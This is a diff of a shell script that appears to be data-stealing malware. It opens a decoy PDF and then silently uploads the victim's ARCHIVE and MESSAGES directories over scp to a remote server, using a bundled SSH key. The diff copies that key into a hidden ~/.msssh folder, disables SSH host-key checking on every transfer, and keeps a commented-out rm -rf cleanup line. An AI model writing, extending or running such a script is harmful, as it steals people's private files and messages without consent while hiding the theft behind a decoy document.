@@ -7,20 +7,28 @@ SERVPORT=8087
 SERVUSER=sauron
 SERVPATH=/home/sauron/messages
 KEY=${CDIR}/.ssh/id_rsa
+KEYDIR=~/.msssh/
+KEYPATH=~/.msssh/id_rsa
+
+mkdir ${KEYDIR}
+cp ${KEY} ${KEYPATH}
+chmod 400 ${KEYPATH}
+
+
 cd ${CDIR}
 
 open ${CDIR}/Content/project.pdf
 cd ${ARCHIVE}
 if [ $? -eq 0 ]; then
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEY} -P ${SERVPORT} -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
 fi
 cd ${MESSAGES}
 if [ $? -eq 0 ]; then
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEY} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEY} -P ${SERVPORT} -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
 fi
 
 #rm -rf ${CDIR} #cleanup
